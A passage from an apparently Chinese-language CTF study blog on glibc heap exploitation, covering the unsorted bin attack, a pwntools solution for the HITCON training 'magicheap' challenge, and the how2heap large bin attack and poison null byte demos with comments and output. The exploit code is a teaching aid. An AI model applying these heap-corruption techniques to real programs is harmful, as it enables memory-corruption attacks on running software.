class="hljs-keyword">for</span> further fastbin attack<br><br>Let<span class="hljs-number">&#x27;</span>s first look at the target we want to rewrite on <span class="hljs-built_in">stack</span>:<br><span class="hljs-number">0x7ffc479ac8c8</span>: <span class="hljs-number">0</span><br><br>Now, we allocate first normal chunk on the heap at: <span class="hljs-number">0x1b38010</span><br>And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>We <span class="hljs-built_in">free</span> the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f25ef9afb78<br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br>And we write it with the target address-16 <span class="hljs-params">(in <span class="hljs-number">32</span>-bits machine, it should be target address<span class="hljs-number">-8</span>)</span>:0x7ffc479ac8b8<br><br>Let&#x27;s <span class="hljs-built_in">malloc</span> again to get the chunk we just <span class="hljs-built_in">free</span>. During this time, the target should have already been rewritten:<br>0x7ffc479ac8c8: 0x7f25ef9afb78<br></code></pre></td></tr></table></figure><h4 id="hitcon-training-magic-heap"><a href="#hitcon-training-magic-heap" class="headerlink" title="hitcon_training_magic_heap"></a>hitcon_training_magic_heap</h4><p>该题只需要修改magic的值大于一个常数就可以进入后门函数，虽然也存在全局变量，可以用unlink来解决，但是使用<code>unsorted_bin_attack</code>的手法更为简单。</p><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./magicheap&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>sdla = <span class="hljs-keyword">lambda</span> infor, data : sh.sendlineafter(infor, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_heap</span>(<span class="hljs-params">size, content</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_heap</span>(<span class="hljs-params">idx, size, content</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del_heap</span>(<span class="hljs-params">idx</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br>create_heap(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 0</span><br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 1</span><br><span class="hljs-comment"># in order not to merge into top chunk</span><br>create_heap(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 2</span><br><br>del_heap(<span class="hljs-number">1</span>)<br><br>magic = <span class="hljs-number">0x6020a0</span><br>fd = <span class="hljs-number">0</span><br>bk = magic - <span class="hljs-number">0x10</span><br><br>edit_heap(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span> + <span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(fd) + p64(bk))<br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment">#trigger unsorted bin attack</span><br>sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;4869&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h2><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><p>该方法和unsorted_bin的利用方法差不多，麻烦的是多了两个指针，需要我们有一个可以改写被释放堆块的漏洞，利用的是unsorted_bin中chunk放入large_bin中缺乏的安全性检查。主要逻辑是将一个large_chunk_1放入large_bin中，然后再将一个large_chunk_2放入unsorted_bin中，修改large_chunk_1的size、bk和bk_nextsize，当large_chunk_1的大小小于large_chunk_2的时候触发漏洞，<strong>注意需要两个chunk是相邻的</strong>，利用的链表操作主要有以下几条：</p><p>修改bk_nextsize的操作：</p><blockquote><p>这里victim是large_chunk_2，fwd是large_chunk_1。</p></blockquote><ul><li><code>victim-&gt;fd_nextsize = fwd</code></li><li><code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code></li><li><code>fwd-&gt;bk_nextsize = victim</code></li><li><code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code></li></ul><p>修改bk的操作：</p><blockquote><p>bck是large_chunk_1的bk指针，victim是large_chunk_2。</p></blockquote><ul><li><code>victim-&gt;bk = bck</code></li><li><code>victim-&gt;fd = fwd</code></li><li><code>fwd-&gt;bk = victim</code></li><li><code>bck-&gt;fd = victim</code></li></ul><p>下面是how2heap源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>           <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the first large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the second large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot; the third large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-comment">// 0x20的堆块主要用于分割和防止合并，无具体意义</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><span class="hljs-comment">// 此时会将p1分割一块0x90，并将剩余的堆块放入unsorted bin中，同时将p2放入large bin中</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br>            <span class="hljs-string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br>            <span class="hljs-string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br>            <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)((<span class="hljs-type">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><span class="hljs-comment">// 此时p3被放入了unsorted bin中</span><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p3[<span class="hljs-number">0</span>]));<br> <br>    <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span><br>            <span class="hljs-string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br>            <span class="hljs-string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br>            <span class="hljs-string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);<br><span class="hljs-comment">// 修改p2的头部</span><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<span class="hljs-comment">//size</span><br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">// fd</span><br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">// fd_nextsize</span><br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<span class="hljs-comment">// bk</span><br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<span class="hljs-comment">// bk_nextsize</span><br><br>    <span class="hljs-comment">//------------------------------------</span><br><span class="hljs-comment">// 将p3放入large bin中，触发漏洞</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br>            <span class="hljs-string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);<br><span class="hljs-comment">// 这时候两个目标地址都被我们写入了p3堆块的头指针</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(stack_var1 != <span class="hljs-number">0</span>);<br>    assert(stack_var2 != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br>This file demonstrates large bin attack by writing a large <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> value into <span class="hljs-built_in">stack</span><br>In practice, large bin attack is generally prepared <span class="hljs-keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="hljs-keyword">for</span> further fastbin attack<br><br>Let<span class="hljs-number">&#x27;</span>s first look at the targets we want to rewrite on <span class="hljs-built_in">stack</span>:<br>stack_var1 (<span class="hljs-number">0x7ffc592e96f0</span>): <span class="hljs-number">0</span><br>stack_var2 (<span class="hljs-number">0x7ffc592e96f8</span>): <span class="hljs-number">0</span><br><br>Now, we allocate the first large chunk on the heap at: <span class="hljs-number">0x5591859ec000</span><br>And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>Then, we allocate the second large chunk on the heap at: 0x5591859ec460<br>And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>Finally, we allocate the third large chunk on the heap at: 0x5591859ec9a0<br>And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>We <span class="hljs-built_in">free</span> the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x5591859ec460 &lt;--&gt; 0x5591859ec000 ]<br><br>Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk <span class="hljs-keyword">for</span> allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x5591859ec0a0 ]<br><br>Now, we <span class="hljs-built_in">free</span> the third large chunk and it will be inserted in the unsorted bin: [ 0x5591859ec9a0 &lt;--&gt; 0x5591859ec0a0 ]<br><br>Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointers<br>Basically, we decrease the size of the freed second large chunk to force <span class="hljs-built_in">malloc</span> to insert the freed third large chunk at the head of the large bin freelist. To overwrite the <span class="hljs-built_in">stack</span> variables, we <span class="hljs-built_in">set</span> &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2<br><br>Let&#x27;s <span class="hljs-built_in">malloc</span> again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:<br><span class="hljs-title function_">stack_var1</span> <span class="hljs-params">(<span class="hljs-number">0x7ffc592e96f0</span>)</span>: 0x5591859ec9a0<br><span class="hljs-title function_">stack_var2</span> <span class="hljs-params">(<span class="hljs-number">0x7ffc592e96f8</span>)</span>: 0x5591859ec9a0<br></code></pre></td></tr></table></figure><p>总结一下，我们构造的主要数据如下：</p><ul><li><code>large_chunk_1.size &lt; large_chunk_2.size</code></li><li><code>large_chunk_1.bk = (unsigned long)(&amp;stack_var1 - 2)</code></li><li><code>large_chunk_1.bk_nextsize = (unsigned long)(&amp;stack_var2 - 4)</code></li></ul><h2 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off_By_One"></a>Off_By_One</h2><h3 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h3><p>通过将被释放的堆块的size低位改为0使其收缩，这样再次分配的时候下一个堆块的<code>pre_size</code>无法得到更新，而由于释放堆块的时候，会通过其<code>pre_size</code>找到上一个堆块进行unlink，这样就会造成堆块重叠。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br><br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><br><br><span class="hljs-type">uint8_t</span>* a;<br><br><span class="hljs-type">uint8_t</span>* b;<br><br><span class="hljs-type">uint8_t</span>* c;<br><br><span class="hljs-type">uint8_t</span>* b1;<br><br><span class="hljs-type">uint8_t</span>* b2;<br><br><span class="hljs-type">uint8_t</span>* d;<br><br><span class="hljs-type">void</span> *barrier;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);<br><br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br><span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br><span class="hljs-comment">// 我们想要溢出a，那么我们就需要知道a的真实大小</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span><br><br><span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, 